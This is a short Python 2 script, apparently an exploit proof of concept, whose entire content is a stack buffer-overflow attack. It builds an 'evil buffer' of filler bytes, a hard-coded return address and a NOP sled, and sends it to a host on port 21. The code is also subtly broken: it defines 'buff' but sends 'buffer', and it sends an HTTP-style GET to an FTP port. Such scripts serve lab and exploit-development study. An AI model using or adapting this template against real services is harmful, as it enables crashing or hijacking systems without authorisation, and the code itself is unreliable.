
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buff = "A"*247 + "\x03\xb5\x56\x76"+"\x90"*366
try:
    print "\nSending evil buffer..."
    s.connect(('192.168.1.116', 21))
    s.send('GET ' + buffer + '\r\n\r\n')
    print s.recv(1024)
    s.close()
    print "\nDone!"
except:
    print "Could not connect"
